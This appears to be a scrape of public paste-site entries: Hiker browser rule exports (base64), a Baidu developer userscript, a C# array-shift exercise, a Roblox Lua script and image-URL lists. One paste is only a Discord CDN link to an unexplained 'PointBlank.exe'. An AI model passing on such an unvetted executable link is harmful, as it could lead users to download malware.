JpbmcoKVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKHBhcmFtcy50YWcgKyBwYXJhbXMuVkFSTUFQLkNBVEVHT1JZLCBKU09OLnN0cmluZ2lmeShwYXJhbXMuY2F0ZV90ZW1wKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLnRhZyArIHBhcmFtcy5WQVJNQVAuVVJMLCBpbnB1dClcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRlX3RlbXA6IGNhdGVfdGVtcCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXg6IGluZGV4LFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWQVJNQVA6IHRoaXMuVkFSTUFQLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWc6IG1UYWcsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtleToga2V5LFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYWdlOiB0aGlzW3N5bWJvbE1hcC5tUGFnZV0sXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1MYXlvdXRdLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG5cXFxcbiAgICDnlYzpnaIobGF5b3V0KSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLmxheW91dChsYXlvdXQpXFxcXG4gICAgfSxcXFxcbiAgICDliIbnsbvpk77mjqUodHJ1ZVVybCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy50cnVlVXJsKHRydWVVcmwpO1xcXFxuICAgIH0sXFxcXG4gICAg6aG156CBKHBhZ2UpIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXMucGFnZShwYWdlKTtcXFxcbiAgICB9LFxcXFxuICAgIOa6kOeggShodG1sKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLmh0bWwoaHRtbCk7XFxcXG4gICAgfSxcXFxcbiAgICDlrprkvY3kuIDnuqfliIbnsbsobGlzdCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5saXN0KGxpc3QpO1xcXFxuICAgIH0sXFxcXG4gICAg5a6a5L2N5a2Q5YiG57G7KHN1Ykxpc3QpIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXMuc3ViTGlzdChzdWJMaXN0KTtcXFxcbiAgICB9LFxcXFxuICAgIOWumuS9jeWIhuexu+agh+mimCh0aXRsZSkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy50aXRsZSh0aXRsZSk7XFxcXG4gICAgfSxcXFxcbiAgICDlrprkvY3liIbnsbvpk77mjqUodXJsKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLnVybCh1cmwpO1xcXFxuICAgIH0sXFxcXG4gICAg5byA5ZCv5YaF572u5oqY5Y+g5Yqf6IO9KCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5mb2xkSW5uZXIodHJ1ZSk7XFxcXG4gICAgfSxcXFxcbiAgICDlhbPpl63lhoXnva7mipjlj6Dlip/og70oKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLmZvbGRJbm5lcihmYWxzZSk7XFxcXG4gICAgfSxcXFxcbiAgICDnrKzlh6DooYzlvIDlp4vmipjlj6AoaW5kZXgpIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXMuZm9sZEluZGV4KGluZGV4KTtcXFxcbiAgICB9LFxcXFxuICAgIOaKmOWPoOaMiemSruagt+W8jyhsYXlvdXQpIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXMuZm9sZExheW91dChsYXlvdXQpXFxcXG4gICAgfSxcXFxcbiAgICDmipjlj6AoZm9sZCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5mb2xkKGZvbGQpO1xcXFxuICAgIH0sXFxcXG4gICAg6YCJ5Lit55qE5YiG57G76aKc6ImyKGNvbG9yKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLmNvbG9yKGNvbG9yKTtcXFxcbiAgICB9LFxcXFxuICAgIOWUr+S4gOagh+ivhihtVGFnKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLnRhZyhtVGFnKVxcXFxuICAgIH0sXFxcXG4gICAg5re75Yqg5YiG57G75a6a5L2NKHJ1bGVPYmopIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXMuYWRkKHJ1bGVPYmopO1xcXFxuICAgIH0sXFxcXG4gICAg5byA5aeL5omT6YCg5YiG57G7KCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5idWlsZCgpO1xcXFxuICAgIH0sXFxcXG5cXFxcbn0pXFxcXG4kLmV4cG9ydHMgPSBuZXcgQ2F0ZWdvcmllc0hlYWRlcigpO1xcXFxuJC5leHBvcnRzXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5Yqo5oCBW+S6jF0qXFxcIixcXFwicGF0aFxcXCI6XFxcImR0ZmxcXFwiLFxcXCJydWxlXFxcIjpcXFwiY29uc3QgZW1wdHkgPSBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuXFxcXG5pZiAodHlwZW9mKOaLvOaOpeWIhuexuykgIT0gJ3VuZGVmaW5lZCcgJiYg5ou85o6l5YiG57G7ICE9ICcnKSB7XFxcXG4gICAgdmFyIGNhdGVnb3JpZXMgPSBwZGZhKGh0bWwsIOWkp+exu+WumuS9jSkuY29uY2F0KHBkZmEoaHRtbCwg5ou85o6l5YiG57G7KSlcXFxcbn0gZWxzZSB7XFxcXG4gICAgdmFyIGNhdGVnb3JpZXMgPSBwZGZhKGh0bWwsIOWkp+exu+WumuS9jSlcXFxcbn1cXFxcblxcXFxubGV0IGluaXRfY2F0ZSA9IFtdXFxcXG5cXFxcbmZvciAobGV0IGkgPSAwOyBpIDwgMjA7IGkrKykge1xcXFxuICAgIGluaXRfY2F0ZS5wdXNoKFxcXFxcXFwiMFxcXFxcXFwiKVxcXFxufVxcXFxuXFxcXG5jb25zdCBmb2xkID0gZ2V0TXlWYXIoTVlfUlVMRS5ncm91cCwgXFxcXFxcXCIwXFxcXFxcXCIpXFxcXG5jb25zdCBjYXRlX3RlbXBfanNvbiA9IGdldE15VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KGluaXRfY2F0ZSkpXFxcXG5jb25zdCBjYXRlX3RlbXAgPSBKU09OLnBhcnNlKGNhdGVfdGVtcF9qc29uKVxcXFxuXFxcXG5pZiAocGFyc2VJbnQocGFnZSkgPT09IDEpIHtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogZm9sZCA9PT0gJzEnID8gJ+KAnOKAnOKAneKAnTxiPicgKyAn4oioJy5mb250Y29sb3IoXFxcXFxcXCIjRkYwMDAwXFxcXFxcXCIpICsgJzwvYj4nIDogJ+KAnOKAnOKAneKAnTxiPicgKyAn4oinJy5mb250Y29sb3IoXFxcXFxcXCIjMWFhZDE5XFxcXFxcXCIpICsgJzwvYj4nLFxcXFxuICAgICAgICB1cmw6ICQoKS5sYXp5UnVsZSgoZm9sZCkgPT4ge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS5ncm91cCwgZm9sZCA9PT0gJzEnID8gJzAnIDogJzEnKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICB9LCBmb2xkKSxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICB9KVxcXFxuICAgIGNhdGVnb3JpZXMuZm9yRWFjaCgoY2F0ZWdvcnksIGluZGV4KSA9PiB7XFxcXG4gICAgICAgIGxldCBzdWJfY2F0ZWdvcmllcyA9IHBkZmEoY2F0ZWdvcnksIOWwj+exu+WumuS9jSk7XFxcXG4gICAgICAgIGlmIChpbmRleCA9PT0gMCkge1xcXFxuICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMuZm9yRWFjaCgoaXRlbSwga2V5KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdGVtLCDliIbnsbvmoIfpopgpXFxcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZijmjpLpmaQpICE9ICd1bmRlZmluZWQnICYmIOaOkumZpCAhPSAnJykge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZSA9IHRpdGxlLnJlcGxhY2UobmV3IFJlZ0V4cCjmjpLpmaQsIFxcXFxcXFwiZ1xcXFxcXFwiKSwgXFxcXFxcXCJcXFxcXFxcIilcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGtleS50b1N0cmluZygpID09PSBjYXRlX3RlbXBbaW5kZXhdID8gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIHRpdGxlLmZvbnRjb2xvcijliIbnsbvpopzoibIpIDogdGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJChwZChpdGVtLCDliIbnsbvpk77mjqUpICsgJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHBhcmFtcykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG5ld19jYXRlID0gW11cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtcy5jYXRlX3RlbXAuZm9yRWFjaCgoY2F0ZSwgaW5kZXgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXdfY2F0ZS5wdXNoKGluZGV4ID09PSAwID8gcGFyYW1zLmtleS50b1N0cmluZygpIDogXFxcXFxcXCIwXFxcXFxcXCIpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS50aXRsZSwgSlNPTi5zdHJpbmdpZnkobmV3X2NhdGUpKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS51cmwsIGlucHV0KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXRlX3RlbXA6IGNhdGVfdGVtcCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGtleToga2V5LFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFnZTogcGFnZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9IGVsc2UgaWYgKGZvbGQgPT09ICcxJykge1xcXFxuICAgICAgICAgICAgc3ViX2NhdGVnb3JpZXMuZm9yRWFjaCgoaXRlbSwga2V5KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHRpdGxlID0gcGRmaChpdGVtLCDliIbnsbvmoIfpopgpXFxcXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZijmjpLpmaQpICE9ICd1bmRlZmluZWQnICYmIOaOkumZpCAhPSAnJykge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZSA9IHRpdGxlLnJlcGxhY2UobmV3IFJlZ0V4cCjmjpLpmaQsIFxcXFxcXFwiZ1xcXFxcXFwiKSwgXFxcXFxcXCJcXFxcXFxcIilcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGtleS50b1N0cmluZygpID09PSBjYXRlX3RlbXBbaW5kZXhdID8gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIHRpdGxlLmZvbnRjb2xvcijliIbnsbvpopzoibIpIDogdGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJChwZChpdGVtLCDliIbnsbvpk77mjqUpICsgJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHBhcmFtcykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcFtwYXJhbXMuaW5kZXhdID0gcGFyYW1zLmtleS50b1N0cmluZygpXFxcXG5cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KHBhcmFtcy5jYXRlX3RlbXApKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfUlVMRS51cmwsIGlucHV0KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UodHJ1ZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXRlX3RlbXA6IGNhdGVfdGVtcCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGluZGV4OiBpbmRleCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGtleToga2V5LFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFnZTogcGFnZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSlcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLlm77niYfop6Plr4YqXFxcIixcXFwicGF0aFxcXCI6XFxcImltZ0RFU1xcXCIsXFxcInJ1bGVcXFwiOlxcXCIkLmV4cG9ydHMuaW1nRGVjcnlwdCA9IGZ1bmN0aW9uKCkge1xcXFxuICAgIHZhciBqYXZhSW1wb3J0ID0gbmV3IEphdmFJbXBvcnRlcigpO1xcXFxuICAgIGphdmFJbXBvcnQuaW1wb3J0UGFja2FnZShcXFxcbiAgICAgICAgUGFja2FnZXMuY29tLmV4YW1wbGUuaGlrZXJ2aWV3LnV0aWxzLFxcXFxuICAgICAgICBQYWNrYWdlcy5qYXZhLmxhbmcsXFxcXG4gICAgICAgIFBhY2thZ2VzLmphdmEuc2VjdXJpdHksXFxcXG4gICAgICAgIFBhY2thZ2VzLmphdmEudXRpbCxcXFxcbiAgICAgICAgUGFja2FnZXMuamF2YS5pbyxcXFxcbiAgICAgICAgUGFja2FnZXMuamF2YS50ZXh0LFxcXFxuICAgICAgICBQYWNrYWdlcy5qYXZheC5jcnlwdG8sXFxcXG4gICAgICAgIFBhY2thZ2VzLmphdmF4LmNyeXB0by5zcGVjXFxcXG4gICAgKTtcXFxcbiAgICB3aXRoKGphdmFJbXBvcnQpIHtcXFxcbiAgICAgICAgbGV0IGJ5dGVzID0gRmlsZVV0aWwudG9CeXRlcyhpbnB1dCk7XFxcXG4gICAgICAgIGZ1bmN0aW9uIGRlY3J5cHREYXRhKGJBcnIpIHtcXFxcbiAgICAgICAgICAgIHZhciBnZW5lcmF0ZVNlY3JldCA9IFNlY3JldEtleUZhY3RvcnkuZ2V0SW5zdGFuY2UoXFxcXFxcXCJkZXNlZGVcXFxcXFxcIikuZ2VuZXJhdGVTZWNyZXQobmV3IERFU2VkZUtleVNwZWMoU3RyaW5nKCdPVzg0VThFZXJkYjk5cnRzVFhXU0lMRE8nKS5nZXRCeXRlcygpKSk7XFxcXG4gICAgICAgICAgICB2YXIgY2lwaGVyID0gQ2lwaGVyLmdldEluc3RhbmNlKFxcXFxcXFwiZGVzZWRlL0NCQy9QS0NTNVBhZGRpbmdcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBjaXBoZXIuaW5pdCgyLCBnZW5lcmF0ZVNlY3JldCwgbmV3IEl2UGFyYW1ldGVyU3BlYyhTdHJpbmcoJ1NLOGJuY1Z1JykuZ2V0Qnl0ZXMoKSkpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIGNpcGhlci5kb0ZpbmFsKGJBcnIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIC8vZGVjcnlwdERhdGHkuLrop6Plr4bmlrnms5VcXFxcbiAgICAgICAgYnl0ZXMgPSBkZWNyeXB0RGF0YShieXRlcyk7XFxcXG4gICAgICAgIHJldHVybiBGaWxlVXRpbC50b0lucHV0U3RyZWFtKGJ5dGVzKTtcXFxcbiAgICB9XFxcXG5cXFxcbn1cXFwifV1cIixcInByb3h5XCI6XCJcIn0iLCJwaWNVcmwiOiJodHRwczovL2ltZy52aW51YS5jbi9pbWFnZXMvdmtoUncuanBlZyIsInRpdGxlIjoi4pqZIOmYheWKqOa8q/CflK7orr7nva4g4pqZIn0=
VUr8VHCt,切换搜索词和sid,stevenos,JavaScript,Thursday 16th of May 2024 03:00:45 AM CDT,"(() => {
    'use strict';

    const ONLINE_HOST_WISE = 'm.baidu.com';
    const ONLINE_HOST_PC = 'www.baidu.com';
    let ONLINE_HOST = ONLINE_HOST_WISE;
    // 获取query
    const href = location.href;
    const urlObj = new URL(href);
    let search = urlObj.search;
    if (search.startsWith('?')) {
        search = search.substring(1);
    }
    if (urlObj.host.startsWith('www.')) {
        ONLINE_HOST = ONLINE_HOST_PC;
    }
    const queries = search.split('&').map(i => i.split('='));
    // 获取sid和搜索词
    const sid = (queries.find(i => i[0] === 'sid') || [])[1];
    const word = (queries.find(i => i[0] === 'word') || [])[1];
    // 存储sid和搜索词
    let storedSids = localStorage.getItem('sids') || '';
    storedSids = json(storedSids) || [];
    if (sid && !storedSids.includes(sid)) {
        storedSids.push(sid);
    }
    storedSids.sort((a, b) => a - b); // 排个序方便找
    let storedWords = localStorage.getItem('words') || '';
    storedWords = json(storedWords) || [];
    if (word && !storedWords.includes(word)) {
        storedWords.push(word);
    }
    localStorage.setItem('words', JSON.stringify(storedWords));
    localStorage.setItem('sids', JSON.stringify(storedSids));

    function json(strings) {
        try {
            return JSON.parse(strings);
        } catch (e) {
            return '';
        }
    }

    function getRamdom() {
        return Math.random().toString(16).substring(2, 8);
    }

    function changeSearchQuery(key, val) {
        const newSearch = queries
            .map(i => {
                if (i[0] === key) {
                    return [key, val].join('=');
                } else {
                    return i.join('=');
                }
            })
            .join('&');
        location.href = [urlObj.origin, urlObj.pathname, `?${newSearch}`].join('');
    }

    function changeHost(newHost = ONLINE_HOST) {
        location.href = [urlObj.protocol, '//', newHost, urlObj.pathname, `?${search}`].join('');
    }

    function clearStorage() {
        localStorage.removeItem('sids');
        localStorage.removeItem('words');
    }

    function exportStorage() {
        const sids = localStorage.getItem('sids');
        const words = localStorage.getItem('words');
        const res = {
            sids: json(sids),
            words: json(words),
        };
        console.log(""'"" + JSON.stringify(res) + ""'"");
        return res;
    }

    function importStorage(res) {
        res = json(res);
        const {sids = [], words = []} = res;
        localStorage.setItem('sids', JSON.stringify(sids));
        localStorage.setItem('words', JSON.stringify(words));
        location.reload();
    }

    function injectMenu() {
        const random = getRamdom();
        console.log(
            `injectMenu-${random} 更新文档：https://ku.baidu-int.com/d/GwPNLacR3Tt0vO`,
            '\n导出的函数：',
            '\nchangeSearchQuery, \nchangeHost, \nclearStorage, \nexportStorage, \nimportStorage'
        );
        window['changeSearchQuery'] = changeSearchQuery;
        window['changeHost'] = changeHost;
        window['clearStorage'] = clearStorage;
        window['exportStorage'] = exportStorage;
        window['importStorage'] = importStorage;

        const html = `
<div id=""menu-${random}"">
    <div>
        <span>sid:</span>
        <select id=""sid-select-${random}"">
            <option value=""0"">无sid</option>
    ${storedSids
        .map(i => `<option value=""${i}"" ${i === sid ? 'selected' : ''}>${i}</option>`)
        .join('')}
        </select>
    </div>
    <div>
        <span>Q:</span>
        <select id=""word-select-${random}"">
    ${storedWords
        .map(
            i =>
                `<option value=""${i}"" ${i === word ? 'selected' : ''}>${decodeURIComponent(
                    i
                )}</option>`
        )
        .join('')}
        </select>
    </div>
    <div>
        <span>Env:</span>
        ${
            urlObj.host === ONLINE_HOST
                ? '<span class=""info"" style=""color: red;"">线上</span>'
                : '<span class=""info"" style=""color: green;"">线下</span><button onclick=""changeHost()"">切换线上</button>'
        }
    </div>
</div>
        `;
        const menuRoot = document.createElement('div');
        menuRoot.innerHTML = html;
        document.body.appendChild(menuRoot);

        const style = `
#menu-${random} {
    position: fixed;
    width: 100%;
    box-sizing: border-box;
    top: 0;
    left: 0;
    line-height: 20px;
    display: flex;
    background: rgba(255, 255, 255, .2);
    box-shadow: 0 2px 4px rgba(255, 255, 255, .5);
    backdrop-filter: blur(2px);
    padding: 0 4px;
    z-index: 999;
}
#menu-${random} .info {
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 0 4px;
}

#menu-${random} button {
    background: #ccc;
    border-radius: 4px;
    padding: 0 4px;
    margin: 0 4px;
    box-shadow: 0 2px 4px #ccc;
}

#menu-${random} select {
    max-width: 120px;
}

        `;
        const styleRoot = document.createElement('style');
        styleRoot.innerHTML = style;
        document.body.appendChild(styleRoot);

        const js = `
const select = document.querySelector('#sid-select-${random}');
select.addEventListener('change', e => {
    let sid = e.target.value;
    if (sid === '0') {
        sid = '';
    }
    changeSearchQuery('sid', sid);
});

const wordSelect = document.querySelector('#word-select-${random}');
wordSelect.addEventListener('change', e => {
    let word = e.target.value;
    if (word) {
        changeSearchQuery('word', word);
    }
});
        `;
        const scriptRoot = document.createElement('script');
        scriptRoot.innerHTML = js;
        document.body.appendChild(scriptRoot);
    }

    injectMenu();
})();"
cuvNU1bZ,ДЗ Сдвиг значений массива,TeT91,C#,Thursday 16th of May 2024 02:13:01 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 1, 2, 3, 4, 5 };

            Console.WriteLine(""Числа в массиве:"");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.WriteLine(""\nНа сколько сдвинуть массив?"");

            int shift = Convert.ToInt32(Console.ReadLine());

            for (int i = 0; i < shift; i++)
            {
                int tempNumber = numbers[0];

                for (int j = 0; j < numbers.Length - 1; j++)
                {
                        numbers[j] = numbers[j + 1];
                }

                numbers[numbers.Length - 1] = tempNumber;
            }

            Console.WriteLine(""Сдвинутый массив"");
            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.ReadKey();
        }
    }
}"
0Emcbf0N,Untitled,lokcwivb,C++,Thursday 16th of May 2024 02:08:54 AM CDT,https://cdn.discordapp.com/attachments/1188075040219090964/1240561555515375668/PointBlank.exe?ex=6647027b&is=6645b0fb&hm=12b305b498352e10ac0a3facb3a2e9353f6747623c7feff2e7cb44dce2c7e6c2&
3s6NCfap,LocalScript (My Amounts),Sungmingamerpro13,CSS,Thursday 16th of May 2024 01:17:20 AM CDT,"local player = game.Players.LocalPlayer
local RoundsAmount = workspace.RoundsLeaderboard:WaitForChild(""RoundsMiddle2"").SurfaceGui.RoundsAmount
local WinsAmount = workspace.WinsLeaderboard:WaitForChild(""WinsMiddle2"").SurfaceGui.WinsAmount

while wait() do
	RoundsAmount.Text = ""My Rounds: ""..player.leaderstats.Rounds.Value
	WinsAmount.Text = ""My Wins: ""..player.leaderstats.Wins.Value
end"
kNWAkXnN,Home Image Carousel (Biram),AhmadXploit,Dart,Thursday 16th of May 2024 12:47:09 AM CDT,"[
        ""https://asset.kompas.com/crops/QUxc9rR2N1ebr5kKwkoiKv77iMg=/0x117:1080x837/750x500/data/photo/2023/05/25/646ef206b4687.jpg"",
        ""https://thumbor.prod.vidiocdn.com/69tlgL9O9Nmw1ah1izt2PsdpH_8=/640x360/filters:quality(75)/vidio-web-prod-video/uploads/video/image/8138415/episode-02-84c91c.jpg"",
        ""https://i.ytimg.com/vi/yAN5uspO_hk/maxresdefault.jpg"",
        ""https://foto.kontan.co.id/IpZIH1FvvUChHZYYpT5VkS16Mqk=/smart/2024/04/29/339158367p.jpg"",
        ""https://images.gmanews.tv/webpics/2024/01/4_-_composite_2024_01_20_10_15_40.jpg""
]"
vJSBtR5e,邀您一起看：主页设置-导入,xiaomianao666,JavaScript,Thursday 16th of May 2024 12:16:17 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置-导入@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjO2dldDtVVEYtODt7VXNlci1BZ2VudEBNb3ppbGxhLzUuMCAoTGludXjvvJvvvJsgQW5kcm9pZCAxMe+8m++8myBNaSAxMCBQcm8pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTUyIE1vYmlsZSBTYWZhcmkvNTM3LjM2fVwiLFwiY29sX3R5cGVcIjpcImljb25fc21hbGxfNFwiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJykpOyhcXG4oYmFzaWMpID0+IHtcXG4gICAgcHV0TXlWYXIoXFxcImNLZXlcXFwiLCBcXFwiaW1wb3J0XFxcIik7XFxuICAgIEhpa2VySG9tZS5sb2FkKFxcXCJpbXBvcnRcXFwiKTtcXG59XFxuKSh7XFxcInZlcnNpb25cXFwiOlxcXCJ2Mi4xLjBcXFwiLFxcXCJmaWxlUGF0aFxcXCI6XFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvanMvTmV3UGxhbkNvbmZpZ0ZpbGUuanNcXFwiLFxcXCJuZXdQbGFuSnNVcmxcXFwiOlxcXCJoaWtlcjovL2Fzc2V0cy9ob21lLmpzXFxcIixcXFwiaHRtbFVybFxcXCI6XFxcImZpbGU6Ly8vc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9jb20uZXhhbXBsZS5oaWtlcnZpZS9maWxlcy9Eb2N1bWVudHMvbmV3UGxhbkhvbWUuaHRtbFxcXCJ9KVwiLFwiZ3JvdXBcIjpcIuKRoOaOqOiNkFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCJ9IiwidGl0bGUiOiLkuLvpobXorr7nva4t5a+85YWlIn0=
KT46XC0K,New (Biram),AhmadXploit,Dart,Thursday 16th of May 2024 12:12:13 AM CDT,"{
  ""news"": [
    {
